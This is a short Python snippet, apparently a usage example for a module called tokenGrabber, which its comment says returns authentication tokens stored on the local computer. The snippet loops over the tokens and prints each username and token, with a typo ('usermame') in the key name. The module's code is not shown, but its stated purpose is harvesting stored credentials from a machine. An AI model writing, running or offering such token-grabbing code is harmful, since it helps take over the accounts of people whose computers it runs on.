import tokenGrabber

# will return local tokens stored in computer. (wont work always)
tokens = tokenGrabber.getTokens()

for token in tokens:
    print(token['usermame'], token['token'])
